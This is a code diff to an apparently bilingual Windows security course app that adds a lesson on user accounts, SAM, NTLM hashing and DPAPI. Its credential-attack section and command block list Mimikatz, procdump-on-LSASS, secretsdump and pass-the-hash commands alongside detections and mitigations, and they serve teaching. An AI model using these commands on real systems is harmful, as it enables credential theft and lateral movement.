@@ -31,11 +31,13 @@ const LESSONS = {
   13: { num: "L13", section: "01", uz: "Thread'lar",                    en: "Threads",                     subUz: "ETHREAD, rejalashtiruvchi, prioritetlar, sinxronizatsiya va thread in'ektsiya", subEn: "ETHREAD, scheduler, priorities, synchronization, and thread injection" },
   14: { num: "L14", section: "01", uz: "Handle'lar",                    en: "Handles",                     subUz: "Ob'ekt menejeri, handle jadvali, turlari, takrorlash, xavfsizlik va handle hujumlari", subEn: "Object Manager, handle table, types, duplication, security, and handle-based attacks" },
   15: { num: "L15", section: "01", uz: "Servislar",                     en: "Services",                    subUz: "SCM, servis turlari, xizmat akkauntlari, svchost guruhlari va servis persistenslik texnikalari", subEn: "SCM, service types, service accounts, svchost groups, and service-based persistence techniques" },
-  16: { num: "L16", section: "01", uz: "DLL",                           en: "DLL",                         subUz: "PE tuzilmasi, DLL yuklash, qidiruv tartibi, in'ektsiya va DLL hijacking texnikalari", subEn: "PE structure, DLL loading, search order, injection, and DLL hijacking techniques" },
-  17: { num: "L17", section: "01", uz: "Windows API",                   en: "Windows API",                 subUz: "Win32 qatlami, ntdll syscall ko'prigi, API hooking va monitoring texnikalari", subEn: "Win32 layer, ntdll syscall bridge, API hooking, and monitoring techniques" },
-  18: { num: "L18", section: "01", uz: "Event Viewer",                  en: "Event Viewer",                subUz: "Windows event log arxitekturasi, asosiy Event ID lar, ETW, Sysmon va forensics", subEn: "Windows event log architecture, key Event IDs, ETW, Sysmon, and forensic analysis" },
-  19: { num: "L19", section: "01", uz: "Task Scheduler",                en: "Task Scheduler",              subUz: "Vazifa arxitekturasi, triggerlar, harakatlar, imtiyozlar va persistenslik texnikalari", subEn: "Task architecture, triggers, actions, privileges, and scheduler-based persistence techniques" },
-  20: { num: "L20", section: "01", uz: "Windows log fayllari",          en: "Windows Logs",                subUz: "EVTX format, log yo'llari, log o'chirish aniqlash va forensic tekshiruv", subEn: "EVTX format, log paths, log clearing detection, and forensic log analysis" },
+  16: { num: "L16", section: "01", uz: "Foydalanuvchi hisoblari",        en: "User Accounts",               subUz: "SAM, SID/RID, NTLM hash, foydalanuvchi profil tuzilmasi, DPAPI va hisob ma'lumotlari hujumlari", subEn: "SAM, SID/RID, NTLM hashing, user profile structure, DPAPI, and credential attacks" },
+  17: { num: "L17", section: "01", uz: "UAC (User Account Control)",    en: "User Account Control",        subUz: "Ajratilgan token, yaxlitlik darajalari, consent.exe, auto-elevation va UAC bypass texnikalari", subEn: "Split token, integrity levels, consent.exe, auto-elevation, and UAC bypass techniques" },
+  18: { num: "L18", section: "01", uz: "DLL",                           en: "DLL",                         subUz: "PE tuzilmasi, DLL yuklash, qidiruv tartibi, in'ektsiya va DLL hijacking texnikalari", subEn: "PE structure, DLL loading, search order, injection, and DLL hijacking techniques" },
+  19: { num: "L19", section: "01", uz: "Windows API",                   en: "Windows API",                 subUz: "Win32 qatlami, ntdll syscall ko'prigi, API hooking va monitoring texnikalari", subEn: "Win32 layer, ntdll syscall bridge, API hooking, and monitoring techniques" },
+  20: { num: "L20", section: "01", uz: "Event Viewer",                  en: "Event Viewer",                subUz: "Windows event log arxitekturasi, asosiy Event ID lar, ETW, Sysmon va forensics", subEn: "Windows event log architecture, key Event IDs, ETW, Sysmon, and forensic analysis" },
+  21: { num: "L21", section: "01", uz: "Task Scheduler",                en: "Task Scheduler",              subUz: "Vazifa arxitekturasi, triggerlar, harakatlar, imtiyozlar va persistenslik texnikalari", subEn: "Task architecture, triggers, actions, privileges, and scheduler-based persistence techniques" },
+  22: { num: "L22", section: "01", uz: "Windows log fayllari",          en: "Windows Logs",                subUz: "EVTX format, log yo'llari, log o'chirish aniqlash va forensic tekshiruv", subEn: "EVTX format, log paths, log clearing detection, and forensic log analysis" },
 };
 
 // ─────────────────────────────────────────────────────────────
@@ -116,14 +118,18 @@ function LessonScreen({ setRoute, user, markLessonComplete, onOpenProfile, lesso
           </> : lessonNum === 15 ? <>
             <SectionServices />
           </> : lessonNum === 16 ? <>
-            <SectionDLL />
+            <SectionUserAccounts />
           </> : lessonNum === 17 ? <>
-            <SectionWindowsAPI />
+            <SectionUAC />
           </> : lessonNum === 18 ? <>
-            <SectionEventViewer />
+            <SectionDLL />
           </> : lessonNum === 19 ? <>
-            <SectionTaskScheduler />
+            <SectionWindowsAPI />
           </> : lessonNum === 20 ? <>
+            <SectionEventViewer />
+          </> : lessonNum === 21 ? <>
+            <SectionTaskScheduler />
+          </> : lessonNum === 22 ? <>
             <SectionWindowsLogs />
           </> : <ComingSoon lesson={LESSON} lessonNum={lessonNum} setRoute={setRoute} />}
 
@@ -263,19 +269,25 @@ const LESSON_META = {
   15: { min: 36, diagrams: 6, labs: 2,
        introUz: <><em>Windows Service</em> — fon rejimida ishlaydigan, foydalanuvchi tizimga kirmagan vaqtda ham faol bo'lgan jarayon. Bu darsda <em>Service Control Manager (SCM)</em>, servis turlari va holatlari, servis akkauntlari (LocalSystem, LocalService, NetworkService), svchost.exe −k guruhlari, servis DACL lari va tajovuzkorlar foydalanadigan servis persistenslik va imtiyozlarni ko'tarish texnikalarini o'rganasiz.</>,
        introEn: <><em>A Windows Service</em> is a process that runs in the background even when no user is logged in. This lesson covers the <em>Service Control Manager (SCM)</em>, service types and states, service accounts (LocalSystem, LocalService, NetworkService), svchost.exe -k groups, service DACLs, and the service persistence and privilege-escalation techniques attackers rely on.</> },
-  16: { min: 36, diagrams: 7, labs: 3,
+  16: { min: 32, diagrams: 5, labs: 2,
+       introUz: <><em>Foydalanuvchi hisoblari</em> — Windows xavfsizligining asosi. Bu darsda <em>SAM ma'lumotlar bazasi</em>, SID/RID tuzilmasi, NTLM hash mexanizmi, foydalanuvchi profil katalog tuzilmasi (AppData, NTUSER.DAT, DPAPI), maxsus tizim akkauntlari (SYSTEM, LocalService) va hujumchilar foydalanadigan hisob ma'lumotlarini o'g'irlash texnikalarini o'rganasiz.</>,
+       introEn: <><em>User accounts</em> are the foundation of Windows security. This lesson covers the <em>SAM database</em>, SID/RID structure, NTLM hashing mechanics, user profile directory structure (AppData, NTUSER.DAT, DPAPI), special system accounts (SYSTEM, LocalService), and the credential theft techniques attackers use.</> },
+  17: { min: 34, diagrams: 6, labs: 2,
+       introUz: <><em>UAC (User Account Control)</em> — hatto adminlar ham standart foydalanuvchi sifatida ishlashiga majburlayan imtiyoz ajratish mexanizmi. Bu darsda <em>ajratilgan token modeli</em>, yaxlitlik darajalari (Untrusted/Low/Medium/High/System), consent.exe va AppInfo, auto-elevation mezonlari va hujumchilar UAC ni chetlab o'tish uchun foydalanadigan texnikalarni o'rganasiz.</>,
+       introEn: <><em>UAC (User Account Control)</em> is the privilege-separation mechanism that forces even admins to run as standard users by default. This lesson covers the <em>split token model</em>, integrity levels (Untrusted/Low/Medium/High/System), consent.exe and AppInfo, auto-elevation criteria, and the techniques attackers use to bypass UAC.</> },
+  18: { min: 36, diagrams: 7, labs: 3,
        introUz: <><em>DLL (Dynamic Link Library)</em> — bir nechta jarayonlar baham ko'ra oladigan umumiy kod va resurslar kutubxonasi. Bu darsda <em>PE formati</em>, DLL yuklash mexanizmi (LoadLibrary, implicit linking), Windows DLL qidiruv tartibi, <em>KnownDlls</em>, DllMain hayot tsikli, DLL in'ektsiya texnikalari (klassik, reflektiv, AppInit) va DLL hijacking hujumlarini o'rganasiz.</>,
        introEn: <><em>A DLL (Dynamic Link Library)</em> is a shared library of code and resources that multiple processes can map into their address space simultaneously. This lesson covers the <em>PE format</em>, DLL loading mechanics (LoadLibrary, implicit linking), Windows DLL search order, <em>KnownDlls</em>, DllMain lifecycle, DLL injection techniques (classic, reflective, AppInit), and DLL hijacking attacks.</> },
-  17: { min: 38, diagrams: 6, labs: 2,
+  19: { min: 38, diagrams: 6, labs: 2,
        introUz: <><em>Windows API</em> — dasturlar operatsion tizim xizmatlariga murojaat qilish uchun foydalanadigan funksiyalar to'plami. Bu darsda <em>Win32 → ntdll → syscall</em> zanjiri, asosiy DLL lar (kernel32, ntdll, advapi32, user32), chaqiruv konventsiyalari (x64 fastcall), <em>API hooking</em> texnikalari (IAT, inline, SSDT), WOW64 qatlami va API monitoringi usullarini o'rganasiz.</>,
        introEn: <><em>The Windows API</em> is the set of functions applications call to access OS services. This lesson covers the <em>Win32 → ntdll → syscall</em> chain, key DLLs (kernel32, ntdll, advapi32, user32), calling conventions (x64 fastcall), <em>API hooking</em> techniques (IAT, inline, SSDT), the WOW64 layer, and API monitoring methods.</> },
-  18: { min: 34, diagrams: 5, labs: 2,
+  20: { min: 34, diagrams: 5, labs: 2,
        introUz: <><em>Windows Event Log</em> — tizim, xavfsizlik va dastur hodisalarini yozib oladigan markaziy jurnal tizimi. Bu darsda <em>ETW (Event Tracing for Windows)</em> arxitekturasi, EVTX format, xavfsizlik auditi uchun muhim Event ID lar (4624, 4625, 4688, 4698, 7045…), Sysmon integratsiyasi va hujumchilar log larni qanday o'chirish yoki chetlab o'tishga urinishlarini o'rganasiz.</>,
        introEn: <><em>Windows Event Log</em> is the central journaling system that records system, security, and application events. This lesson covers the <em>ETW (Event Tracing for Windows)</em> architecture, EVTX format, critical Event IDs for security auditing (4624, 4625, 4688, 4698, 7045…), Sysmon integration, and how attackers attempt to clear or bypass logging.</> },
-  19: { min: 32, diagrams: 5, labs: 2,
+  21: { min: 32, diagrams: 5, labs: 2,
        introUz: <><em>Windows Task Scheduler</em> — vaqt yoki tizim hodisalariga asosida vazifalarni avtomatik bajaradigan tizim. Bu darsda vazifa XML tuzilmasi, trigger turlari (vaqt, hodisa, yuklash, kirish), harakatlar, imtiyozlar, <em>COM-asosli bajarish</em> mexanizmi va hujumchilar Task Scheduler dan persistenslik, lateral movement va UAC bypass uchun qanday foydalanishini o'rganasiz.</>,
        introEn: <><em>Windows Task Scheduler</em> is the system that automatically runs tasks based on time or system events. This lesson covers task XML structure, trigger types (time, event, boot, logon), actions, privilege settings, the <em>COM-based execution</em> mechanism, and how attackers use the Task Scheduler for persistence, lateral movement, and UAC bypass.</> },
-  20: { min: 30, diagrams: 4, labs: 2,
+  22: { min: 30, diagrams: 4, labs: 2,
        introUz: <><em>Windows log fayllari</em> — tizim faoliyatining doimiy yozuvi. Bu darsda <em>EVTX ikkilik formati</em>, asosiy log fayllari va ularning yo'llari, PowerShell/WMI/ETW yordamida log so'rov qilish, log o'chirish va tahrif qilish aniqlash usullari va real forensics tekshiruvida qanday izlarni qidirish kerakligini o'rganasiz.</>,
        introEn: <><em>Windows log files</em> are the persistent record of system activity. This lesson covers the <em>EVTX binary format</em>, key log files and their paths, querying logs with PowerShell/WMI/ETW, detecting log clearing and tampering, and what traces to look for in a real forensic investigation.</> },
 };
@@ -5011,6 +5023,630 @@ sc delete TestSvc
 
 # Yangi servis yaratish tekshiruvi (Event ID 7045)
 Get-WinEvent -LogName System | Where {$_.Id -eq 7045} | Select -First 10 | Format-List`}</code></pre>
+    </section>
+  );
+}
+
+// ─────────────────────────────────────────────────────────────
+function SectionUserAccounts() {
+  const lang = useLang();
+  return lang === "en" ? (
+    <section>
+      <H2 num="§1" en="User Accounts and Profiles" uz="" />
+      <P>Every security decision in Windows ultimately traces back to <Term>who is running the code</Term>. User accounts define identity; the profile stores per-user state; credentials are the proof of identity. Understanding how Windows stores, hashes, and uses credentials — and where attackers exploit that chain — is foundational to both offensive and defensive work.</P>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — Account Types</h3>
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginTop:12}}>
+        {[
+          {type:"Local Administrator",color:"var(--c-err)",desc:"Full control over the local machine. Built-in account: RID 500. Even with UAC, admin users hold a split token — filtered (medium IL) at login, elevated on demand. The built-in Administrator account bypasses UAC by default (auto-elevated)."},
+          {type:"Standard User",color:"var(--c-system)",desc:"Can run programs and change own settings. Cannot install software system-wide, modify system files, or change other users' settings. Runs at Medium Integrity Level. The correct default for day-to-day use."},
+          {type:"Guest",color:"var(--text-2)",desc:"RID 501. Disabled by default since Windows XP SP2. Extremely limited — no persistent profile changes. Was historically exploited for lateral movement; disable if present."},
+          {type:"SYSTEM (NT AUTHORITY\\SYSTEM)",color:"var(--c-err)",desc:"Not a real logon account — a special identity used by the OS and services. Has SeDebugPrivilege, SeTcbPrivilege, and unrestricted local access. Attacker goal: code running as SYSTEM = full machine compromise."},
+          {type:"LocalService (NT AUTHORITY\\LocalService)",color:"var(--c-warn)",desc:"Reduced-privilege service account. No network access. Used by EventLog, nsi. SID: S-1-5-19."},
+          {type:"NetworkService (NT AUTHORITY\\NetworkService)",color:"var(--c-warn)",desc:"Reduced privilege locally but authenticates over the network as the machine account. Used by DNS Client, WMI. SID: S-1-5-20."},
+          {type:"TrustedInstaller",color:"#b48cff",desc:"Owner of most Windows system files. Even SYSTEM cannot modify them without first taking ownership. NT SERVICE\\TrustedInstaller is why you get 'Access denied' even as admin."},
+          {type:"WDAGUtilityAccount",color:"var(--text-2)",desc:"Windows Defender Application Guard sandboxed browser account. Auto-managed, should never be used interactively."},
+        ].map((item,i)=>(
+          <div key={i} style={{padding:"10px 12px",borderRadius:8,background:`${item.color}08`,border:`1px solid ${item.color}22`}}>
+            <div style={{fontFamily:"var(--font-mono)",fontSize:11,color:item.color,fontWeight:700,marginBottom:5}}>{item.type}</div>
+            <div style={{fontSize:12,color:"var(--text-1)",lineHeight:1.6}}>{item.desc}</div>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — SAM Database and SID Structure</h3>
+      <P>Local accounts are stored in the <Term>SAM (Security Account Manager)</Term> database — a registry hive at <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>C:\Windows\System32\config\SAM</code>. It is locked by the SYSTEM process while Windows is running — you cannot copy it directly. The SAM hive stores password hashes encrypted with a key derived from the SYSTEM hive (historically called SYSKEY, now always enabled).</P>
+      <P>Every account has a <Term>SID (Security Identifier)</Term> — a unique identifier used in ACLs and tokens:</P>
+      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.9,overflowX:"auto",marginTop:10}}><code>{`SID Format: S-Revision-IdentifierAuthority-SubAuthority1-...-RID
+
+Examples:
+S-1-5-18                        → SYSTEM (well-known, always same)
+S-1-5-19                        → LocalService
+S-1-5-20                        → NetworkService
+S-1-5-21-[domain]-500           → Local Administrator (RID 500)
+S-1-5-21-[domain]-501           → Guest (RID 501)
+S-1-5-21-[domain]-1000          → First regular user account
+S-1-5-21-[domain]-1001          → Second regular user account
+
+Common Well-Known SIDs:
+S-1-1-0    Everyone
+S-1-5-11   Authenticated Users
+S-1-5-32-544  BUILTIN\Administrators group
+S-1-5-32-545  BUILTIN\Users group
+S-1-16-4096   Low Integrity Level
+S-1-16-8192   Medium Integrity Level
+S-1-16-12288  High Integrity Level
+S-1-16-16384  System Integrity Level`}</code></pre>
+      <Callout color="var(--c-system)" icon="info" titleEn="RID 500 vs renamed Administrator" titleUz="">
+        Many organizations rename the built-in Administrator account (RID 500) to something else, thinking it hides it. The SID — including the RID 500 — is still visible in access tokens and event logs. Attackers enumerate the RID, not the name. Renaming provides no real security.
+      </Callout>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — NTLM Password Hashing</h3>
+      <P>Windows stores passwords as <Term>NTLM hashes</Term> (also called NT hashes). The algorithm:</P>
+      <div style={{display:"flex",flexDirection:"column",gap:6,marginTop:12}}>
+        {[
+          {step:"1. Input",desc:"User's password in plaintext, e.g., 'P@ssw0rd'"},
+          {step:"2. Encode",desc:"Convert to UTF-16LE encoding (little-endian 16-bit Unicode)"},
+          {step:"3. Hash",desc:"Compute MD4 hash of the UTF-16LE bytes → 16-byte (32 hex char) NTLM hash"},
+          {step:"4. Store",desc:"Hash stored in SAM hive, encrypted with SYSKEY-derived key. Also cached in LSASS memory as a credential."},
+        ].map((item,i)=>(
+          <div key={i} style={{display:"flex",gap:12,padding:"8px 12px",borderRadius:6,background:"rgba(255,255,255,0.02)",border:"1px solid var(--border)"}}>
+            <span style={{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",minWidth:55,flexShrink:0,fontWeight:700}}>{item.step}</span>
+            <span style={{fontSize:13,color:"var(--text-1)"}}>{item.desc}</span>
+          </div>
+        ))}
+      </div>
+      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:12}}><code>{`# Python: compute NTLM hash manually
+import hashlib
+password = "P@ssw0rd"
+ntlm = hashlib.new('md4', password.encode('utf-16-le')).hexdigest()
+print(ntlm)  # → e19ccf75ee54e06b06a5907af13cef42
+
+# LM hash (legacy, disabled by default since Vista):
+# - Password truncated/padded to 14 chars, split into two 7-char halves
+# - Each half DES-encrypted with a fixed key
+# - Completely broken: case-insensitive, max 14 chars, easily cracked
+# Check if LM hashes are disabled:
+reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v NoLMHash`}</code></pre>
+      <Callout color="var(--c-err)" icon="warning" titleEn="NTLM hashes ARE the password for Pass-the-Hash" titleUz="">
+        NTLM authentication doesn't require the plaintext password — it only requires the hash. An attacker who extracts the NTLM hash from SAM or LSASS can authenticate as that user without ever cracking the password. This is <em>Pass-the-Hash</em> (PtH) — one of the most devastating lateral movement techniques in Windows environments.
+      </Callout>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — User Profile Structure</h3>
+      <P>When a user logs in for the first time, Windows creates a <Term>user profile</Term> at <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>C:\Users\[username]\</code> (copied from <code>C:\Users\Default</code>). Key directories and files:</P>
+      <div style={{overflowX:"auto",marginTop:12}}>
+        <table style={{width:"100%",borderCollapse:"collapse",fontSize:13}}>
+          <thead><tr style={{borderBottom:"1px solid var(--border)"}}>
+            {["Path (relative to C:\\Users\\user\\)","Contents","Security / Forensic Notes"].map(h=><th key={h} style={{textAlign:"left",padding:"8px 12px",color:"var(--text-2)",fontWeight:600}}>{h}</th>)}
+          </tr></thead>
+          <tbody>{[
+            ["NTUSER.DAT","User registry hive — mounted as HKCU at logon","Contains run keys, shell folder paths, most recently used (MRU) lists — critical forensic artifact"],
+            ["AppData\\Local","Machine-local app data — not synced","Browser caches, Temp files, app databases (e.g., Chrome profile)"],
+            ["AppData\\Roaming","Synced in domain environments (roaming profile)","Windows credentials XML, SSH keys, Outlook profiles, many app configs"],
+            ["AppData\\LocalLow","Low-integrity process app data","IE/Edge sandbox data, protected-mode plugin data"],
+            ["AppData\\Local\\Microsoft\\Windows\\INetCache","IE/Edge cache","Forensic: downloaded file evidence even after browser history cleared"],
+            ["AppData\\Local\\Microsoft\\Windows\\Recent","LNK shortcuts (jump lists)","Evidence of file access with timestamps and original file paths"],
+            ["AppData\\Local\\Microsoft\\Credentials","DPAPI-encrypted credential blobs","Stored passwords (Credential Manager, IE saved passwords, WiFi keys)"],
+            ["AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","PowerShell command history","Attacker commands — critical forensic find"],
+            ["Desktop, Documents, Downloads","User files","Malware drop zone — check for unexpected EXEs/scripts"],
+          ].map((r,i)=><tr key={i} style={{borderBottom:"1px solid rgba(255,255,255,0.04)",background:i%2===0?"transparent":"rgba(255,255,255,0.015)"}}>
+            {r.map((c,j)=><td key={j} style={{padding:"7px 12px",color:j===0?"var(--accent)":"var(--text-1)",fontFamily:j===0?"var(--font-mono)":"inherit",fontSize:j===0?10:13}}>{c}</td>)}
+          </tr>)}
+          </tbody>
+        </table>
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — DPAPI (Data Protection API)</h3>
+      <P><Term>DPAPI</Term> is Windows' built-in secret protection mechanism. It encrypts blobs using a <em>master key</em> derived from the user's password (and optionally a machine key). The key never leaves the machine in plaintext — Windows re-derives it on the fly from the user's credentials. DPAPI protects: Credential Manager blobs, Chrome/Edge saved passwords, WiFi PSK keys, certificate private keys, SSH agent keys.</P>
+      <div style={{display:"flex",flexDirection:"column",gap:6,marginTop:12}}>
+        {[
+          "User logs in → LSASS derives master key from password + SID + entropy",
+          "Master key encrypted with user's password hash → stored in AppData\\Roaming\\Microsoft\\Protect\\[SID]\\",
+          "Application calls CryptProtectData(plaintext, NULL, NULL, …) → DPAPI returns encrypted blob",
+          "Blob stored by app (Credential Manager, Chrome, etc.)",
+          "Decryption: CryptUnprotectData(blob) → DPAPI looks up master key → decrypts blob using master key",
+          "Attack: if attacker has the user's NTLM hash or password, they can re-derive the master key offline and decrypt all DPAPI blobs (Mimikatz: dpapi::masterkey /in:… /hash:NTLM)",
+        ].map((step,i)=>(
+          <div key={i} style={{display:"flex",gap:12,alignItems:"flex-start",padding:"8px 12px",borderRadius:6,background:"rgba(255,255,255,0.02)",border:"1px solid var(--border)"}}>
+            <span style={{fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)",minWidth:20,flexShrink:0}}>{i+1}.</span>
+            <span style={{fontSize:13,color:"var(--text-1)"}}>{step}</span>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Credential Attack Techniques</h3>
+      <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
+        {[
+          {title:"SAM + SYSTEM Extraction (Offline)",color:"var(--c-attack)",body:<>The SAM hive is encrypted with a key from the SYSTEM hive. Extract both: <code>reg save HKLM\SAM sam.hiv</code> and <code>reg save HKLM\SYSTEM system.hiv</code> (requires admin). Then use <code>secretsdump.py -sam sam.hiv -system system.hiv LOCAL</code> (Impacket) to extract all NTLM hashes offline. Detection: reg save creates EventID 4663 (if object access auditing enabled) + large registry file created in unusual path.</>},
+          {title:"LSASS Memory Dump",color:"var(--c-err)",body:<>LSASS holds credentials of all logged-in users in memory: NTLM hashes, Kerberos tickets, cleartext (WDigest, legacy). Attack: <code>procdump -ma lsass.exe lsass.dmp</code> or Task Manager → Create dump → open with Mimikatz. Detection: Sysmon Event 10 (ProcessAccess on lsass.exe with PROCESS_VM_READ). Microsoft Defender detects procdump targeting lsass. PPL (Protected Process Light) + Credential Guard are mitigations.</>},
+          {title:"Pass-the-Hash (PtH)",color:"var(--c-warn)",body:<>Use an extracted NTLM hash to authenticate without the plaintext password: <code>pth-winexe //target -U DOMAIN/user%hash cmd</code> or Mimikatz <code>sekurlsa::pth /user:admin /ntlm:HASH /domain:target</code>. Works because NTLM authentication only requires the hash, not the password. Mitigation: LAPS (random per-machine local admin passwords), Credential Guard (removes NTLM hash from LSASS), Protected Users security group (disables NTLM).</>},
+          {title:"Credential Manager Extraction",color:"var(--c-system)",body:<>Windows stores saved credentials (RDP passwords, network shares, website logins) in Credential Manager, encrypted with DPAPI. Extract: <code>cmdkey /list</code> (list saved credentials), Mimikatz <code>dpapi::cred</code>, or PowerShell <code>[Windows.Security.Credentials.PasswordVault]::new().RetrieveAll()</code> for web credentials. Browser passwords also DPAPI-protected — tools like SharpChrome extract them.</>},
+        ].map((item,i)=>(
+          <div key={i} style={{padding:"14px 16px",borderRadius:10,background:`${item.color}08`,border:`1px solid ${item.color}30`}}>
+            <div style={{fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,color:item.color,marginBottom:8}}>{item.title}</div>
+            <div style={{fontSize:13,color:"var(--text-1)",lineHeight:1.65}}>{item.body}</div>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Practical Commands</h3>
+      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# List local users and groups
+net user                              # all local accounts
+net user Administrator                # details on specific account
+Get-LocalUser | Select Name, Enabled, PasswordLastSet, LastLogon
+Get-LocalGroupMember Administrators   # who's in local admins
+
+# SID lookup
+whoami /user                          # current user's SID
+Get-LocalUser | Select Name, SID
+wmic useraccount get name,sid         # all accounts + SIDs
+
+# Profile locations
+Get-ChildItem C:\\Users               # all profiles
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
+
+# Credential Manager
+cmdkey /list                          # list stored credentials
+# (Mimikatz, requires admin)
+sekurlsa::logonpasswords              # dump LSASS credentials
+lsadump::sam                          # dump SAM hashes (SYSTEM privilege)
+dpapi::cred /in:"%appdata%\\Microsoft\\Credentials\\[blob]"  # decrypt DPAPI blob
+
+# Check if LM hashes disabled (should be 1)
+reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v NoLMHash`}</code></pre>
+    </section>
+  ) : (
+    <section>
+      <H2 num="§1" uz="Foydalanuvchi Hisoblari va Profillari" en="" />
+      <P>Windows dagi har bir xavfsizlik qarori oxir-oqibat <Term>kim kodni bajarayotgani</Term>ga qaytadi. Foydalanuvchi hisoblari identifikatorni belgilaydi; profil foydalanuvchiga xos holatni saqlaydi; hisob ma'lumotlari identifikatorning isboti. Windows hisob ma'lumotlarini qanday saqlashi, hashlashi va ishlatishini — va hujumchilar bu zanjirni qanday ekspluatatsiya qilishini tushunish hujumkor va himoyaviy ish uchun ham asosiy hisoblanadi.</P>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — Akkount Turlari</h3>
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginTop:12}}>
+        {[
+          {type:"Mahalliy Administrator",color:"var(--c-err)",desc:"Mahalliy mashina ustidan to'liq nazorat. O'rnatilgan akkount: RID 500. UAC bilan ham, admin foydalanuvchilar ajratilgan tokenga ega — kirishda filtrlangan (o'rta IL), talab bo'yicha ko'tarilgan. O'rnatilgan Administrator akkaunti standart bo'yicha UAC ni chetlab o'tadi (auto-elevated)."},
+          {type:"Standart Foydalanuvchi",color:"var(--c-system)",desc:"Dasturlarni ishga tushirishi va o'z sozlamalarini o'zgartirishi mumkin. Tizim bo'yicha dastur o'rnata olmaydi, tizim fayllarini o'zgartira olmaydi. O'rta Yaxlitlik Darajasida ishlaydi. Kundalik foydalanish uchun to'g'ri standart."},
+          {type:"Mehmon",color:"var(--text-2)",desc:"RID 501. Windows XP SP2 dan beri standart bo'yicha o'chirilgan. Juda cheklangan — doimiy profil o'zgarishlari yo'q. Tarixan lateral movement uchun ekspluatatsiya qilingan; mavjud bo'lsa o'chiring."},
+          {type:"SYSTEM (NT AUTHORITY\\SYSTEM)",color:"var(--c-err)",desc:"Haqiqiy kirish akkaunti emas — OS va xizmatlar tomonidan ishlatiladigan maxsus identitet. SeDebugPrivilege, SeTcbPrivilege va chegsiz mahalliy kirishga ega. Hujumchi maqsadi: SYSTEM sifatida ishlaydigan kod = to'liq mashina buzilishi."},
+          {type:"LocalService (NT AUTHORITY\\LocalService)",color:"var(--c-warn)",desc:"Kamaytarilgan imtiyozli xizmat akkaunti. Tarmoq kirishi yo'q. EventLog, nsi tomonidan ishlatiladi. SID: S-1-5-19."},
+          {type:"NetworkService (NT AUTHORITY\\NetworkService)",color:"var(--c-warn)",desc:"Mahalliy kamaytarilgan imtiyoz, lekin tarmoq orqali mashina akkaunti sifatida autentifikatsiya qiladi. DNS Client, WMI tomonidan ishlatiladi. SID: S-1-5-20."},
+          {type:"TrustedInstaller",color:"#b48cff",desc:"Ko'p Windows tizim fayllarining egasi. Hatto SYSTEM ham egalikni olmasa ularni o'zgartira olmaydi. NT SERVICE\\TrustedInstaller admin sifatida ham 'Kirish rad etildi' olishingizning sababi."},
+          {type:"WDAGUtilityAccount",color:"var(--text-2)",desc:"Windows Defender Application Guard sandboxlangan brauzer akkaunti. Avtomatik boshqariladi, interaktiv foydalanilmasligi kerak."},
+        ].map((item,i)=>(
+          <div key={i} style={{padding:"10px 12px",borderRadius:8,background:`${item.color}08`,border:`1px solid ${item.color}22`}}>
+            <div style={{fontFamily:"var(--font-mono)",fontSize:11,color:item.color,fontWeight:700,marginBottom:5}}>{item.type}</div>
+            <div style={{fontSize:12,color:"var(--text-1)",lineHeight:1.6}}>{item.desc}</div>
+          </div>
+        ))}
+      </div>
+
+      <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — SAM Ma'lumotlar Bazasi va SID Tuzilishi</h3>
+      <P>Mahalliy akkauntlar <Term>SAM (Xavfsizlik Akkount Menejeri)</Term> ma'lumotlar bazasida saqlanadi — <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>C:\Windows\System32\config\SAM</code> da registry hive. Windows ishlab turganida SYSTEM jarayoni tomonidan bloklanadi — uni to'g'ridan-to'g'ri ko'chira olmaysiz. SAM hive SYSTEM hive dan olingan kalit bilan shifrlangan parol hashlari saqlaydi.</P>
+      <P>Har bir akkountda <Term>SID (Xavfsizlik Identifikatori)</Term> mavjud — ACL lar va tokenlarda ishlatiladigan noyob identifikator:</P>
+      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.9,overflowX:"auto",marginTop:10}}><code>{`SID Formati: S-Reviziya-IdentifikatorAuthority-SubAuthority1-...-RID
+
+Misollar:
+S-1-5-18                        → SYSTEM (taniqli, har doim bir xil)
+S-1-5-19                        → LocalService
+S-1-5-20                        → NetworkService
+S-1-5-21-[domen]-500            → Mahalliy Administrator (RID 500)
